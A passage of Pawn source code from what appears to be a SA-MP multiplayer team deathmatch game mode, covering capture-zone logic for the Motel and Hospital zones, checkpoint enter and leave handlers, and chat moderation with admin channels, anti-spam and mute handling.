			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[MOTEL], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[MOTEL] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*MOTEL is under attack!");
			    }
			    else if(tCP[MOTEL] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*MOTEL is under attack!");
			    }
			    else if(tCP[MOTEL] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*MOTEL is under attack!");
			    }
			    else if(tCP[MOTEL] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*MOTEL is under attack!");
				}
				else if(tCP[MOTEL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*MOTEL is under attack!");
				}
				else if(tCP[MOTEL] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Motel is under attack!");
				}
				else if(tCP[MOTEL] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Motel is under attack!");
				}
				else if(tCP[MOTEL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][MOTEL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock MotelCaptured(playerid)
{
	Captured[playerid][MOTEL] = 1;
	UnderAttack[MOTEL] = 0;
	KillTimer(timer[playerid][MOTEL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][MOTEL] = 25;
    GivePlayerScore(playerid, 30);
    GivePlayerMoney(playerid, 30000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"MOTEL\" you received +30 scores and +$30000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][MOTEL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"MOTEL"cwhite"! You received +15 score for it!");
		   GivePlayerScore(i, 15);
	   }
	}
	//==========================================================================
	tCP[MOTEL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[MOTEL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[MOTEL], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"MOTEL\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingMOTEL(playerid)
{
	Captured[playerid][MOTEL] = 1;
	UnderAttack[MOTEL] = 0;
	KillTimer(timer[playerid][MOTEL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][MOTEL] = 25;
    GangZoneStopFlashForAll(Zone[MOTEL]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][MOTEL] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Motel(playerid);
public Motel(playerid)
{
	MotelCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveHospital(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[HOSPITAL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[HOSPITAL] = 1;
			 	timer[playerid][HOSPITAL] = SetTimerEx("Hospital", 25000, false,"i",playerid);
			 	Captured[playerid][HOSPITAL] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[HOSPITAL], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[HOSPITAL] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Hospital is under attack!");
			    }
			    else if(tCP[HOSPITAL] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Hospital is under attack!");
			    }
			    else if(tCP[HOSPITAL] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Hospital is under attack!");
			    }
			    else if(tCP[HOSPITAL] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Hospital is under attack!");
				}
				else if(tCP[HOSPITAL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Hospital is under attack!");
				}
				else if(tCP[HOSPITAL] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Hospital is under attack!");
				}
				else if(tCP[HOSPITAL] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Hospital is under attack!");
				}
				else if(tCP[HOSPITAL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][HOSPITAL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock HospitalCaptured(playerid)
{
	Captured[playerid][HOSPITAL] = 1;
	UnderAttack[HOSPITAL] = 0;
	KillTimer(timer[playerid][HOSPITAL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][HOSPITAL] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Hospital\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][HOSPITAL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Hospital"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[HOSPITAL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[HOSPITAL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[HOSPITAL], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Hospital\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingHospital(playerid)
{
	Captured[playerid][HOSPITAL] = 1;
	UnderAttack[HOSPITAL] = 0;
	KillTimer(timer[playerid][HOSPITAL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][HOSPITAL] = 25;
    GangZoneStopFlashForAll(Zone[HOSPITAL]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][HOSPITAL] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Hospital(playerid);
public Hospital(playerid)
{
	HospitalCaptured(playerid);
	return 1;
}
//==============================================================================
//============================[ OnPlayerEnter and OnPlayerLeave Dynamic CP]=====
//==============================================================================
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	if(checkpointid == CP[SNAKE])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[SNAKE] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[SNAKE] != gTeam[playerid]) {
						CountVar[playerid][SNAKE] = 25;
						ActiveSnakeFarm(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BAY])
	{
        if(Spectating[playerid] == 0) {
			if(UnderAttack[BAY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BAY] != gTeam[playerid]) {
						CountVar[playerid][BAY] = 25;
						ActiveBay(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BIG])
	{
        if(Spectating[playerid] == 0) {
			if(UnderAttack[BIG] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BIG] != gTeam[playerid]) {
						CountVar[playerid][BIG] = 25;
						ActiveArea69(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[ARMY])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[ARMY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[ARMY] != gTeam[playerid]) {
						CountVar[playerid][ARMY] = 25;
						ActiveArmy(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[PETROL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[PETROL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[PETROL] != gTeam[playerid]) {
						CountVar[playerid][PETROL] = 25;
						ActivePetrol(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[OIL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[OIL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[OIL] != gTeam[playerid]) {
						CountVar[playerid][OIL] = 25;
						ActiveOil(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[DESERT])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[DESERT] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[DESERT] != gTeam[playerid]) {
						CountVar[playerid][DESERT] = 25;
						ActiveDesert(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[QUARRY])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[QUARRY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[QUARRY] != gTeam[playerid]) {
						CountVar[playerid][QUARRY] = 25;
						ActiveQuarry(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[GUEST])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[GUEST] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[GUEST] != gTeam[playerid]) {
						CountVar[playerid][GUEST] = 25;
						ActiveGuest(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[EAR])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[EAR] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[EAR] != gTeam[playerid]) {
						CountVar[playerid][EAR] = 25;
						ActiveEar(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[AIRPORT])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[AIRPORT] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[AIRPORT] != gTeam[playerid]) {
						CountVar[playerid][AIRPORT] = 25;
						ActiveAirport(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[SHIP])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[SHIP] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[SHIP] != gTeam[playerid]) {
						CountVar[playerid][SHIP] = 25;
						ActiveShip(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[GAS])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[GAS] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[GAS] != gTeam[playerid]) {
						CountVar[playerid][GAS] = 25;
						ActiveGas(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[RES])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[RES] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[RES] != gTeam[playerid]) {
						CountVar[playerid][RES] = 25;
						ActiveRes(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	/*else if(checkpointid == CP[NPP])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[NPP] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[NPP] != gTeam[playerid]) {
						CountVar[playerid][NPP] = 25;
						ActiveNPP(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}*/
	else if(checkpointid == CP[MOTEL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[MOTEL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[MOTEL] != gTeam[playerid]) {
						CountVar[playerid][MOTEL] = 25;
						ActiveMOTEL(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BATTLESHIP])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[BATTLESHIP] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BATTLESHIP] != gTeam[playerid]) {
						CountVar[playerid][BATTLESHIP] = 25;
						ActiveBATTLESHIP(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[HOSPITAL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[HOSPITAL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[HOSPITAL] != gTeam[playerid]) {
						CountVar[playerid][HOSPITAL] = 25;
						ActiveHospital(playerid);
					} else return SendClientMessage(playerid, red,"*This zone is already captured by your team!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	return 1;
}
public OnPlayerLeaveDynamicCP(playerid, checkpointid)
{
	if(checkpointid == CP[SNAKE] && Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1 && !IsPlayerInDynamicCP(playerid, CP[SNAKE]))
	{
		LeavingSnakeFarm(playerid);
	}
	if(checkpointid == CP[BAY] && Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1 && !IsPlayerInDynamicCP(playerid, CP[BAY]))
	{
		LeavingBay(playerid);
	}
	if(checkpointid == CP[BIG] && Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1 && !IsPlayerInDynamicCP(playerid, CP[BIG]))
	{
		LeavingArea69(playerid);
	}
	if(checkpointid == CP[ARMY] && Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1 && !IsPlayerInDynamicCP(playerid, CP[ARMY]))
	{
		LeavingArmy(playerid);
	}
	if(checkpointid == CP[PETROL] && Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1 && !IsPlayerInDynamicCP(playerid, CP[PETROL]))
	{
		LeavingPetrol(playerid);
	}
	if(checkpointid == CP[OIL] && Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1 && !IsPlayerInDynamicCP(playerid, CP[OIL]))
	{
		LeavingOil(playerid);
	}
	if(checkpointid == CP[DESERT] && Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1 && !IsPlayerInDynamicCP(playerid, CP[DESERT]))
	{
		LeavingDesert(playerid);
	}
	if(checkpointid == CP[QUARRY] && Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1 && !IsPlayerInDynamicCP(playerid, CP[QUARRY]))
	{
		LeavingQuarry(playerid);
	}
	if(checkpointid == CP[GUEST] && Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1 && !IsPlayerInDynamicCP(playerid, CP[GUEST]))
	{
		LeavingGuest(playerid);
	}
	if(checkpointid == CP[EAR] && Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1 && !IsPlayerInDynamicCP(playerid, CP[EAR]))
	{
		LeavingEar(playerid);
	}
	if(checkpointid == CP[AIRPORT] && Captured[playerid][AIRPORT] == 0 && IsPlayerCapturing[playerid][AIRPORT] == 1 && !IsPlayerInDynamicCP(playerid, CP[AIRPORT]))
	{
		LeavingAirport(playerid);
	}
	if(checkpointid == CP[SHIP] && Captured[playerid][SHIP] == 0 && IsPlayerCapturing[playerid][SHIP] == 1 && !IsPlayerInDynamicCP(playerid, CP[SHIP]))
	{
		LeavingShip(playerid);
	}
	if(checkpointid == CP[GAS] && Captured[playerid][GAS] == 0 && IsPlayerCapturing[playerid][GAS] == 1 && !IsPlayerInDynamicCP(playerid, CP[GAS]))
	{
		LeavingGas(playerid);
	}
	if(checkpointid == CP[RES] && Captured[playerid][RES] == 0 && IsPlayerCapturing[playerid][RES] == 1 && !IsPlayerInDynamicCP(playerid, CP[RES]))
	{
		LeavingRes(playerid);
	}
	/*if(checkpointid == CP[NPP] && Captured[playerid][NPP] == 0 && IsPlayerCapturing[playerid][NPP] == 1 && !IsPlayerInDynamicCP(playerid, CP[NPP]))
	{
		LeavingNuclear(playerid);
	}*/
	if(checkpointid == CP[MOTEL] && Captured[playerid][MOTEL] == 0 && IsPlayerCapturing[playerid][MOTEL] == 1 && !IsPlayerInDynamicCP(playerid, CP[MOTEL]))
	{
		LeavingMOTEL(playerid);
	}
	if(checkpointid == CP[BATTLESHIP] && Captured[playerid][BATTLESHIP] == 0 && IsPlayerCapturing[playerid][BATTLESHIP] == 1 && !IsPlayerInDynamicCP(playerid, CP[BATTLESHIP]))
	{
		LeavingBattleShip(playerid);
	}
	if(checkpointid == CP[HOSPITAL] && Captured[playerid][HOSPITAL] == 0 && IsPlayerCapturing[playerid][HOSPITAL] == 1 && !IsPlayerInDynamicCP(playerid, CP[HOSPITAL]))
	{
		LeavingHospital(playerid);
	}
	return 1;
}
//==============================================================================
public OnPlayerText(playerid, text[])
{
	if(text[0] == '.' && PlayerInfo[playerid][Level] >= 1) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"[A.Chat]: %s: %s",string,text[1]);
		MessageToAdmins(0xFD01FDAA,string);
		return 0;
	}
    if(text[0] == '@' && PlayerInfo[playerid][Level] >= 5) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"[L5.Chat]: %s: %s",string,text[1]);
		MessageTo5(0x710C7EC8,string);
	    return 0;
	}
 	if(text[0] == '$' && PlayerInfo[playerid][Level] >= 6) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"[Secret.Chat]: %s: %s",string,text[1]); MessageTo6(0x99FF00AA,string);
	    return 0;
	}
    if(ServerInfo[DisableChat] == 1) {
		SendClientMessage(playerid,red,"Chat has been disabled");
	 	return 0;
	}
 	if(PlayerInfo[playerid][Muted] == 1)
	{
 		PlayerInfo[playerid][MuteWarnings]++;
 		new string[128];
		if(PlayerInfo[playerid][MuteWarnings] < ServerInfo[MaxMuteWarnings]) {
			format(string, sizeof(string),"Server: You are muted, if you continue to speak you will be kicked. (%d / %d)", PlayerInfo[playerid][MuteWarnings], ServerInfo[MaxMuteWarnings] );
			SendClientMessage(playerid,red,string);
		} else {
			SendClientMessage(playerid,red,"You have been warned ! Now you have been kicked");
			format(string, sizeof(string),"Server has kicked %s (ID %d) (Exceed Mute Warnings)", PlayerName2(playerid), playerid);
			SendClientMessageToAll(grey,string);
			SaveToFile("KickLog",string); Kick(playerid);
		} return 0;
	}
	if(ServerInfo[AntiSpam] == 1 && (PlayerInfo[playerid][Level] == 0 && !IsPlayerAdmin(playerid)) )
	{
		if(PlayerInfo[playerid][SpamCount] == 0) PlayerInfo[playerid][SpamTime] = TimeStamp();

	    PlayerInfo[playerid][SpamCount]++;
		if(TimeStamp() - PlayerInfo[playerid][SpamTime] > SPAM_TIMELIMIT) { // Its OK your messages were far enough apart
			PlayerInfo[playerid][SpamCount] = 0;
			PlayerInfo[playerid][SpamTime] = TimeStamp();
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS) {
			new string[64]; format(string,sizeof(string),"Server has kicked %s (Flood/Spam Protection)", PlayerName2(playerid));
			SendClientMessageToAll(red,string); print(string);
			SaveToFile("KickLog",string);
			Kick(playerid);
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS-1) {
			SendClientMessage(playerid,red,"Server: Anti Spam Warning! Next is a kick.");
			return 0;
		}
	}
	if(ServerInfo[AntiSwear] == 1 && PlayerInfo[playerid][Level] < ServerInfo[MaxAdminLevel])
	for(new s = 0; s < ForbiddenWordCount; s++)
    {
		new pos;
		while((pos = strfind(text,ForbiddenWords[s],true)) != -1) for(new i = pos, j = pos + strlen(ForbiddenWords[s]); i < j; i++) text[i] = '*';
	}

	if(PlayerInfo[playerid][Caps] == 1) UpperToLower(text);
	if(ServerInfo[NoCaps] == 1) UpperToLower(text);

	for(new i = 1; i < MAX_CHAT_LINES-1; i++) Chat[i] = Chat[i+1];
 	new ChatSTR[128]; GetPlayerName(playerid,ChatSTR,sizeof(ChatSTR)); format(ChatSTR,128,"[lchat]%s: %s",ChatSTR, text[0] );
	Chat[MAX_CHAT_LINES-1] = ChatSTR;

    switch (PlayerInfo[playerid][OnDuty])
    {
	case 0:
	{
	    new string[128];
	    format(string,sizeof(string),"%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text);
	    SetPlayerChatBubble(playerid, text, 0xFFFFFFFF, 100.0, 10000);
	    printf("%s [%i]: %s", PlayerName2(playerid),playerid,text);
	    SendClientMessageToAll(GetPlayerColor(playerid),string);
	    return 0;
    }
    case 1:
    {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"Admin %s: %s",aName,text);
	    printf(string2);
	    SendClientMessageToAll(COLOR_PINK,string2);
        return 0;
    }
    }
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{

    if(pickupid == ChinaP && GetPlayerTeam(playerid) != TEAM_CHINA) return SendClientMessage(playerid, 0xFF0000AA, "Only CHINA team can use this briefcase.");
	{
    if(pickupid == ChinaP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == PP && GetPlayerTeam(playerid) != TEAM_PAKISTAN) return SendClientMessage(playerid, 0xFF0000AA, "Only Pakistan team can use this briefcase.");
	{
